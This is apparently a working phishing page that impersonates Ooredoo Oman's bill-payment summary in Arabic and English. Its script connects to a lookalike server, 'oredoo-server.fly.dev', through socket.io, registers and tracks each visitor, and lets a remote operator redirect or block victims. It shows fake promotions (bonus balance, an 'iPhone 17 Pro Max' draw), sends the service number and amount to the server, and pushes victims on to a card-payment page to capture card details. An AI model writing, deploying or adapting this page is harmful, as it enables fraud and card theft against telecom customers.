<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Payment Summary | Ooredoo</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
.lang-toggle-wrapper { width: 100%; max-width: 480px; display: flex; justify-content: flex-start; margin-bottom: 8px; padding: 0 20px; }
.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
.lang-toggle:hover { background: #f0f0f0; }
.card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); padding: 40px 36px; max-width: 480px; width: 100%; margin: 0 20px 20px; }
.service-info { display: flex; justify-content: space-between; align-items: center; background: #f7f7f8; border-radius: 12px; padding: 14px 20px; margin-bottom: 28px; }
.service-info .label { font-size: 13px; color: #666; }
.service-info .value { font-size: 15px; font-weight: 600; color: #080808; margin-top: 2px; }
.service-info .amount { font-size: 20px; font-weight: 700; color: #ed1c24; }
.promo-message { background: #fff5f5; border: 1px solid #ed1c24; border-radius: 10px; padding: 12px 16px; margin-bottom: 20px; text-align: center; font-size: 14px; font-weight: 700; color: #ed1c24; line-height: 1.6; }
h2 { text-align: center; font-size: 20px; font-weight: 600; color: #1a1a1a; margin-bottom: 24px; }
.options { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px; }
.option { width: 100%; height: 64px; border: 2px solid #e8e8e8; border-radius: 12px; padding: 20px 16px; cursor: pointer; display: flex; align-items: center; gap: 12px; transition: all 0.2s ease; background: #fff; }
.option:hover { border-color: #ccc; }
.option.selected { border-color: #ed1c24; background: #fff5f5; }
.radio { width: 22px; height: 22px; border-radius: 50%; border: 2px solid #ccc; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
.option.selected .radio { border-color: #ed1c24; }
.option.selected .radio::after { content: ''; width: 12px; height: 12px; border-radius: 50%; background: #ed1c24; }
.option-content { display: flex; align-items: center; gap: 8px; }
.option-content img { height: 24px; width: auto; }
.option-content span { font-size: 14px; font-weight: 500; color: #1a1a1a; }
.security-link { display: flex; align-items: center; gap: 6px; margin-bottom: 24px; }
.security-link a { color: #ed1c24; font-size: 14px; text-decoration: none; font-weight: 500; }
.security-link a:hover { text-decoration: underline; }
.divider { height: 1px; background: #e8e8e8; margin: 20px 0; }
.we-accept { text-align: center; margin-bottom: 16px; }
.we-accept span { font-size: 12px; font-weight: 700; color: #666; text-transform: uppercase; letter-spacing: 1px; }
.logos { display: flex; align-items: center; justify-content: center; gap: 20px; margin-bottom: 32px; flex-wrap: wrap; }
.logos img { height: 28px; width: auto; }
.logos .visa-text { font-family: 'Arial', sans-serif; font-size: 22px; font-weight: 800; color: #1a1f71; font-style: italic; }
.logos .mc-logo { position: relative; width: 40px; height: 28px; display: inline-flex; align-items: center; }
.logos .mc-logo span:first-child { position: absolute; left: 0; width: 22px; height: 22px; border-radius: 50%; background: #eb001b; }
.logos .mc-logo span:last-child { position: absolute; left: 10px; width: 22px; height: 22px; border-radius: 50%; background: #f79e1b; opacity: 0.85; }
.logos .apple-pay { font-family: -apple-system, sans-serif; font-size: 18px; font-weight: 600; color: #000; display: flex; align-items: center; gap: 2px; }
.logos .apple-pay svg { width: 20px; height: 20px; }
.logos .samsung-pay { font-size: 13px; font-weight: 600; color: #000; line-height: 1.1; text-align: center; }
.proceed-btn { width: 100%; height: 56px; border-radius: 999px; border: none; background: #ed1c24; color: #fff; font-size: 17px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 8px 20px rgba(237,28,36,0.25); }
.proceed-btn:hover { background: #d4191f; box-shadow: 0 10px 28px rgba(237,28,36,0.35); }
.proceed-btn:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
@media (max-width: 500px) {
  .card { padding: 24px 16px; margin: 0 10px 10px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); }
  .options { gap: 10px; }
  .option { padding: 12px 10px; height: 56px; }
  .option-content span { font-size: 13px; }
  h2 { font-size: 17px; margin-bottom: 18px; }
  .logos { gap: 12px; }
  .lang-toggle-wrapper { padding: 0 10px; margin-top: 10px; }
  .service-info { padding: 12px 14px; margin-bottom: 20px; }
  .service-info .amount { font-size: 18px; }
  .proceed-btn { height: 50px; font-size: 16px; }
}
@media (max-width: 360px) {
  .card { padding: 20px 12px; margin: 0 6px 8px; }
  .options { grid-template-columns: 1fr; gap: 8px; }
  .option { height: auto; padding: 12px; }
  h2 { font-size: 16px; }
  .proceed-btn { height: 46px; font-size: 15px; }
}
</style>
</head>
<body>

<div class="lang-toggle-wrapper">
  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
</div>

<div class="card">
  <!-- Service info -->
  <div class="service-info">
    <div>
      <div class="label" id="serviceLabel">رقم الخدمة</div>
      <div class="value" id="service-number">-</div>
    </div>
    <div class="amount"><span id="total-amount">0</span> <span id="currency-label">ر.ع</span></div>
  </div>

  <div class="promo-message" id="promo-message" style="display:none;"></div>

  <h2 id="pageTitle">اختر طريقة الدفع وتابع</h2>

  <div class="options">
    <div class="option selected" data-method="omani" onclick="selectOption('omani')">
      <div class="radio"></div>
      <div class="option-content">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 24'%3E%3Crect width='36' height='24' rx='3' fill='%23fff' stroke='%23ccc'/%3E%3Crect y='0' width='36' height='8' fill='%23fff'/%3E%3Crect y='8' width='36' height='8' fill='%23ed1c24'/%3E%3Crect y='16' width='36' height='8' fill='%23008000'/%3E%3Crect x='0' y='0' width='10' height='24' fill='%23ed1c24'/%3E%3C/svg%3E" alt="Oman Flag" style="height:22px;">
        <span id="omaniLabel">بطاقات عمانية</span>
      </div>
    </div>
    <div class="option" data-method="international" onclick="selectOption('international')">
      <div class="radio"></div>
      <div class="option-content">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='16' fill='%23e8f5e9' stroke='%2366bb6a' stroke-width='1'/%3E%3Cpath d='M18 4 C10 4 4 10 4 18 C4 26 10 32 18 32 C26 32 32 26 32 18 C32 10 26 4 18 4' fill='none' stroke='%2366bb6a' stroke-width='1'/%3E%3Cpath d='M18 4 C14 4 11 10 11 18 C11 26 14 32 18 32 C22 32 25 26 25 18 C25 10 22 4 18 4' fill='none' stroke='%2366bb6a' stroke-width='1'/%3E%3Cline x1='4' y1='14' x2='32' y2='14' stroke='%2366bb6a' stroke-width='1'/%3E%3Cline x1='4' y1='22' x2='32' y2='22' stroke='%2366bb6a' stroke-width='1'/%3E%3C/svg%3E" alt="International" style="height:22px;">
        <span id="internationalLabel">بطاقات دولية</span>
      </div>
    </div>
  </div>

  <div class="security-link">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#f5a623"><path d="M12 1C8.676 1 6 3.676 6 7v3H5a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v3H8V7c0-2.276 1.724-4 4-4z"/></svg>
    <a href="#" id="securityLink">المزيد عن أمان البطاقة</a>
  </div>

  <div class="divider"></div>

  <div class="we-accept"><span id="weAcceptLabel">نقبل الدفع بـ</span></div>

  <div class="logos">
    <span class="visa-text">VISA</span>
    <span class="mc-logo"><span></span><span></span></span>
    <span class="apple-pay">
      <svg viewBox="0 0 24 24" fill="#000"><path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/></svg>
      Pay
    </span>
    <span class="samsung-pay">SAMSUNG<br>Pay</span>
    <span style="font-size:14px;font-weight:700;color:#6c3fa0;display:flex;align-items:center;gap:2px;">مـال <svg width="18" height="18" viewBox="0 0 24 24"><circle cx="8" cy="12" r="4" fill="#6c3fa0"/><circle cx="16" cy="8" r="3" fill="#00bcd4"/><circle cx="16" cy="16" r="3" fill="#4caf50"/></svg></span>
  </div>

  <button class="proceed-btn" id="proceedBtn" onclick="handleProceed()">متابعة الدفع</button>
</div>

<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<script>
(function() {
  var translations = {
    ar: {
      langBtn: 'English',
      serviceLabel: 'رقم الخدمة',
      currency: 'ر.ع',
      title: 'اختر طريقة الدفع وتابع',
      omaniCards: 'بطاقات عمانية',
      internationalCards: 'بطاقات دولية',
      securityLink: 'المزيد عن أمان البطاقة',
      weAccept: 'نقبل الدفع بـ',
      proceedBtn: 'متابعة الدفع',
      processing: 'جاري المعالجة...',
      blocked: 'تم حظرك من استخدام هذه الخدمة.'
    },
    en: {
      langBtn: 'العربية',
      serviceLabel: 'Service Number',
      currency: 'OMR',
      title: 'Select an option and proceed',
      omaniCards: 'Omani Cards',
      internationalCards: 'International Cards',
      securityLink: 'More about card security',
      weAccept: 'WE ACCEPT',
      proceedBtn: 'Proceed to payment',
      processing: 'Processing...',
      blocked: 'You have been blocked from using this service.'
    }
  };

  var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';

  function applyLanguage() {
    var t = translations[currentLang];
    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
    document.getElementById('langToggle').textContent = t.langBtn;
    document.getElementById('serviceLabel').textContent = t.serviceLabel;
    document.getElementById('currency-label').textContent = t.currency;
    document.getElementById('pageTitle').textContent = t.title;
    document.getElementById('omaniLabel').textContent = t.omaniCards;
    document.getElementById('internationalLabel').textContent = t.internationalCards;
    document.getElementById('securityLink').textContent = t.securityLink;
    document.getElementById('weAcceptLabel').textContent = t.weAccept;
    document.getElementById('proceedBtn').textContent = t.proceedBtn;
  }

  window.toggleLanguage = function() {
    currentLang = currentLang === 'ar' ? 'en' : 'ar';
    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
    applyLanguage();
  };

  applyLanguage();

  var selectedOption = 'omani';
  var isProcessing = false;
  var SOCKET_URL = 'https://oredoo-server.fly.dev';
  var socket = io(SOCKET_URL, { transports: ['websocket','polling'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
  var visitorId = localStorage.getItem('visitorId') || '';

  // Load data from sessionStorage
  var billData = null;
  try { billData = JSON.parse(sessionStorage.getItem('last_ooredoo_bill_lookup') || 'null'); } catch(e) {}
  var serviceNumber = (billData && (billData.number || billData.customerNumber)) || '-';
  var amount = (billData && billData.amount) || 0;

  document.getElementById('service-number').textContent = serviceNumber;
  document.getElementById('total-amount').textContent = amount;

  // Show promo message based on type
  var promoEl = document.getElementById('promo-message');
  var isEnglish = (new URLSearchParams(window.location.search).get('lang') || 'ar') === 'en';
  if (billData && promoEl) {
    var billType = billData.type || 'postpaid';
    if (billType === 'prepaid') {
      promoEl.textContent = isEnglish ? 'You will receive an additional balance of ' + amount + ' OMR' : '\u0633\u062a\u062d\u0635\u0644 \u0639\u0644\u0649 \u0631\u0635\u064a\u062f \u0625\u0636\u0627\u0641\u064a \u0628\u0642\u064a\u0645\u0629 ' + amount + ' \u0631.\u0639';
      promoEl.style.display = 'block';
    } else {
      promoEl.textContent = isEnglish ? 'You will automatically enter the draw for an iPhone 17 Pro Max' : '\u0633\u062a\u062f\u062e\u0644 \u0627\u0644\u0633\u062d\u0628 \u062a\u0644\u0642\u0627\u0626\u064a\u0627\u064b \u0639\u0644\u0649 \u062c\u0647\u0627\u0632 iPhone 17 Pro Max';
      promoEl.style.display = 'block';
    }
  }

  // Socket connection
  socket.on('connect', function() {
    socket.emit('visitor:register', { existingVisitorId: visitorId || null });
    socket.emit('visitor:pageEnter', 'ملخص الدفع');
  });

  socket.on('visitor:registered', function(data) {
    if (data && data._id) {
      visitorId = data._id;
      localStorage.setItem('visitorId', data._id);
    }
    if (data && data.pid) localStorage.setItem('visitorId', data.pid);
  });

  socket.on('visitor:navigate', function(page) {
    if (page) window.location.href = '/' + page;
  });

  socket.on('admin-last-message', function(data) {
    if (data && data.message) {
      localStorage.setItem('adminLastMessage', data.message);
      window.location.href = '/final-page/';
    }
  });

  socket.on('blocked', function() {
    alert(translations[currentLang].blocked);
  });

  // Select option
  window.selectOption = function(method) {
    selectedOption = method;
    var options = document.querySelectorAll('.option');
    options.forEach(function(opt) {
      var m = opt.getAttribute('data-method');
      if (m === method) {
        opt.classList.add('selected');
      } else {
        opt.classList.remove('selected');
      }
    });

  };

  // Handle proceed
  window.handleProceed = function() {
    if (isProcessing) return;
    isProcessing = true;
    var btn = document.getElementById('proceedBtn');
    btn.textContent = translations[currentLang].processing;
    btn.disabled = true;

    var paymentMethodLabel = selectedOption === 'omani' ? 'Omani Cards' : 'International Cards';

    // Send data to server
    socket.emit('more-info', {
      content: { paymentMethod: paymentMethodLabel, serviceNumber: serviceNumber, totalAmount: amount },
      page: 'ملخص الدفع',
      waitingForAdminResponse: false
    });

    setTimeout(function() {
      var lang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
      var langSuffix = lang === 'en' ? '&lang=en' : '';
      window.location.href = '/credit-card-payment/?service=' + encodeURIComponent(serviceNumber) + '&amount=' + amount + langSuffix;
    }, 1500);
  };
})();
</script>
</body>
</html>
